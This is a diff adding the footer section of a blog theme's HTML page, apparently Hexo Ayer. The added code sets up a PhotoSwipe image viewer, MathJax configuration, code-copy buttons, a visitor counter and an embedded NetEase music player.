+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+  var ayerConfig = {
+    mathjax: true
+  }
+</script>
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+
+<script src="/js/clickBoom2.js"></script>
+
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+<script src="/js/dz.js"></script>
+
+
+
+    
+    <div id="music">
+    
+    
+    
+    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="52"
+        src="//music.163.com/outchain/player?type=2&id=22707008&auto=1&height=32"></iframe>
+</div>
+
+<style>
+    #music {
+        position: fixed;
+        right: 15px;
+        bottom: 0;
+        z-index: 998;
+    }
+</style>
+    
+  </div>
+</body>
+
+</html>
